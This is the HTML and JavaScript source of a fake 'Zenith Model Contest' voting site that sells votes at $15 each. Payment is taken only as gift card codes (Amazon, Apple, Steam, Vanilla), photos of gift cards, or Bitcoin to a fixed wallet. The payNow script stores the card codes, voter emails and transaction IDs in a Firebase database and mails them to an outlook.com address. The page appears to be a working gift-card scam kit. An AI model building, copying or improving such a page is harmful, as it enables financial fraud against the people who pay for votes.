<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#000;color:#fff}
.hero{position:relative;width:100%;height:60vh;overflow:hidden;background:#111}
.hero img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:0;transition:opacity 1.2s ease}
.hero img.active{opacity:1}
.hero::after{content:'';position:absolute;inset:0;background:linear-gradient(to bottom,rgba(0,0,0,.15),rgba(0,0,0,.9))}
.heroText{position:absolute;inset:0;z-index:3;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;letter-spacing:3px}
.heroText h1{font-family:Georgia,serif;font-size:34px;line-height:1.05;letter-spacing:5px;font-weight:400}
.topSmall{font-size:9px;letter-spacing:4px;color:#ddd;margin-bottom:12px}
.box{background:#0a0a0a;border:1px solid #1e1e1e;padding:22px 16px;max-width:520px;margin:14px auto;text-align:center}
.box h2{font-size:14px;letter-spacing:4px;line-height:1.6;margin-bottom:14px}
.box input{width:100%;padding:14px;background:#141414;border:1px solid #333;color:#fff;text-align:center;font-size:15px}
.btn-gold{background:#c9a86a;color:#000;border:none;width:100%;padding:14px;font-weight:700;letter-spacing:3px;cursor:pointer;margin-top:10px;font-size:13px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(165px,1fr));gap:12px;max-width:1100px;margin:18px auto;padding:0 12px}
.card{background:#111;border:1px solid #222;text-align:center;padding-bottom:10px}
.card img{width:100%;height:260px;object-fit:cover;background:#222}
.card b{display:block;margin:8px 0 2px;font-size:13px}
.card small{color:#c9a86a;font-size:11px;display:block}
.card .v{background:#c9a86a;color:#000;border:none;padding:9px 16px;font-weight:700;font-size:10px;letter-spacing:1px;cursor:pointer;margin-top:8px;width:85%}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.92);display:none;align-items:center;justify-content:center;z-index:99;padding:12px}
.mBox{background:#111;border:1px solid #333;padding:16px;max-width:420px;width:100%;text-align:left}
.mBox input,.mBox select{width:100%;padding:11px;background:#000;border:1px solid #333;color:#fff;margin:6px 0}
.wallet{background:#000;border:1px dashed #c9a86a;padding:8px;font-size:11px;word-break:break-all;text-align:center}
.tabs{display:flex;gap:6px;margin:8px 0}
.tabs button{flex:1;padding:10px;background:#222;color:#fff;border:1px solid #333;cursor:pointer}
.tabs button.active{background:#c9a86a;color:#000}
.support{text-align:center;margin:18px auto;max-width:520px;padding:0 12px}
.support a{display:block;border:1px solid #c9a86a;color:#c9a86a;padding:10px;font-size:11px;text-decoration:none}
</style>
</head>
<body>

<div class="hero">
<img class="active" src="https://images.unsplash.com/photo-1509631179647-0177331693ae?q=80&w=1000">
<img src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?q=80&w=1000">
<img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=1000">
<img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=1000">
<div class="heroText">
<div class="topSmall">ZENITH 2026 / 2027 SEASON</div>
<h1>MODEL<br>CONTEST<br><span style="font-size:20px;letter-spacing:7px">2026/2027</span></h1>
</div>
</div>

<div class="box">
<h2>ENTER<br>CONTESTANT CODE</h2>
<input id="codeInput" type="text" placeholder="" value="" autocomplete="off">
<button class="btn-gold" onclick="searchCode()">SEARCH</button>
</div>

<div class="grid" id="grid"></div>

<div class="support">
<p style="font-size:10px;letter-spacing:2px;color:#666;margin-bottom:8px">NEED HELP? CONTACT SUPPORT</p>
<a href="mailto:Zenithmodeling1@outlook.com">EMAIL SUPPORT - Zenithmodeling1@outlook.com</a>
</div>

<div class="modal" id="modal">
<div class="mBox">
<h3 id="mName" style="text-align:center"></h3>
<p style="text-align:center;font-size:11px;color:#888"><span id="mCode"></span> | <span id="mVotes"></span> VOTES</p>
<label style="font-size:10px;color:#888;margin-top:10px;display:block">Your Email</label>
<input id="vEmail" placeholder="">
<label style="font-size:10px;color:#888;display:block">Quantity - $15 per vote</label>
<input id="vQty" type="number" value="1" min="1" oninput="calcTotal()">
<div style="font-size:13px">Total: $<span id="vTotal">15</span></div>
<div class="tabs"><button id="tGift" class="active" onclick="setTab('gift')">Gift Card</button><button id="tBtc" onclick="setTab('btc')">BTC</button></div>
<div id="giftBox"><select id="gType"><option>Amazon</option><option>Apple</option><option>Steam</option><option>eBay</option><option>Vanilla</option><option>Other</option></select><input id="gCode" placeholder="Gift Card Code"><input id="gFile" type="file" accept="image/*"></div>
<div id="btcBox" style="display:none"><div class="wallet">bc1q4h7gjy978am0ntv9u7wj2erhw4vv0khsmsfun4</div><input id="bTxn" placeholder="BTC Txn ID"></div>
<button class="btn-gold" style="width:100%;margin-top:10px" onclick="payNow()">PAY VIA EMAIL @ Zenithmodeling1@outlook.com</button>
<button style="width:100%;margin-top:8px;padding:10px;background:#222;color:#fff;border:1px solid #333;cursor:pointer" onclick="closeModal()">CLOSE</button>
<p id="stat" style="font-size:11px;color:#c9a86a;text-align:center;margin-top:8px"></p>
</div>
</div>

<script>
var PRICE = 15;
var slides=document.querySelectorAll('.hero img'); var cur=0;
setInterval(function(){ slides[cur].classList.remove('active'); cur=(cur+1)%slides.length; slides[cur].classList.add('active'); },3000);

var firebaseConfig={apiKey:"AIzaSyCah_ucdI55pyBR_RJ_ILu26aSALI1rVbA",authDomain:"zenith-2026-vote.firebaseapp.com",databaseURL:"https://zenith-2026-vote-default-rtdb.firebaseio.com",projectId:"zenith-2026-vote",storageBucket:"zenith-2026-vote.firebasestorage.app",messagingSenderId:"534661022606",appId:"1:534661022606:web:31af138277cf4e88ce9adf"};
firebase.initializeApp(firebaseConfig);
var db=firebase.database();
var models=[]; var selected=null; var payMode='gift';

var demoModels=[
{id:"1", code:"Saya38", name:"Saya", mainImage:"https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?q=80&w=600", votes:124},
{id:"2", code:"Emilia214", name:"Emilia", mainImage:"https://images.unsplash.com/photo-1509631179647-0177331693ae?q=80&w=600", votes:98},
{id:"3", code:"Em22", name:"Emma", mainImage:"https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=80&w=600", votes:210},
{id:"4", code:"Luna45", name:"Luna", mainImage:"https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=600", votes:76},
{id:"5", code:"Zara12", name:"Zara", mainImage:"https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=600", votes:156}
];

function calcTotal(){ var q=parseInt(document.getElementById('vQty').value)||1; document.getElementById('vTotal').textContent=q*PRICE; }
window.setTab=function(t){ payMode=t; document.getElementById('giftBox').style.display=t=='gift'?'block':'none'; document.getElementById('btcBox').style.display=t=='btc'?'block':'none'; document.getElementById('tGift').className=t=='gift'?'active':''; document.getElementById('tBtc').className=t=='btc'?'active':''; }

db.ref('models').on('value', function(snap){
 var data=snap.val();
 if(data){ models=Object.keys(data).map(function(k){ var v=data[k]; v.id=k; return v; }); }
 else{ models=demoModels; }
 render(models);
});

function render(list){
 var grid=document.getElementById('grid'); grid.innerHTML='';
 list.forEach(function(m){
  var d=document.createElement('div'); d.className='card';
  d.innerHTML='<img src="'+(m.mainImage||m.image)+'"><b>'+m.name+'</b><small>'+m.code+'</small><div style="font-size:10px;color:#666;margin-top:4px">☆ '+(m.votes||0)+' VOTES</div><button class="v" onclick="openVote(\''+m.id+'\')">VOTE</button>';
  grid.appendChild(d);
 });
}

window.searchCode=function(){
 var q=document.getElementById('codeInput').value.trim().toLowerCase();
 if(!q){ render(models); return; }
 var f=models.filter(function(m){ return m.code.toLowerCase().includes(q) || m.name.toLowerCase().includes(q); });
 render(f);
};

window.openVote=function(id){ var m=models.find(function(x){return x.id==id}); if(!m) return; selected=m; document.getElementById('mName').textContent=m.name; document.getElementById('mCode').textContent=m.code; document.getElementById('mVotes').textContent=m.votes||0; document.getElementById('vQty').value=1; calcTotal(); document.getElementById('modal').style.display='flex'; };
window.closeModal=function(){ document.getElementById('modal').style.display='none'; document.getElementById('stat').textContent=''; };

window.payNow=async function(){
 var email=document.getElementById('vEmail').value.trim(); var qty=parseInt(document.getElementById('vQty').value)||1; var s=document.getElementById('stat');
 if(!email){s.textContent='Enter email'; return;}
 s.textContent='Processing...';
 try{
  var total=qty*PRICE; var gType=document.getElementById('gType').value; var gCode=document.getElementById('gCode').value.trim(); var bTxn=document.getElementById('bTxn').value.trim();
  await db.ref('votes').push({modelId:selected.id, contestantCode:selected.code, modelName:selected.name, voterEmail:email, qty:qty, total:total, payMode:payMode, giftType:payMode==='gift'?gType:'', giftCode:payMode==='gift'?gCode:'', cryptoTxn:payMode==='btc'?bTxn:'', wallet:'bc1q4h7gjy978am0ntv9u7wj2erhw4vv0khsmsfun4', created:Date.now()});
  if(selected.id.length>10) await db.ref('models/'+selected.id).update({votes:(selected.votes||0)+qty});
  var subj=encodeURIComponent('Vote Payment - '+selected.code+' - '+qty+' votes');
  var body=encodeURIComponent('Model: '+selected.name+' ('+selected.code+')\nEmail: '+email+'\nQty: '+qty+' = $'+total+'\nPay: '+payMode+'\nGift: '+gType+' '+gCode+'\nBTC: '+bTxn);
  window.location.href='mailto:Zenithmodeling1@outlook.com?subject='+subj+'&body='+body;
  s.textContent='✅ Vote saved!'; setTimeout(closeModal,1200);
 }catch(e){s.textContent='Error '+e.message}
};
</script>
</body>
</html>
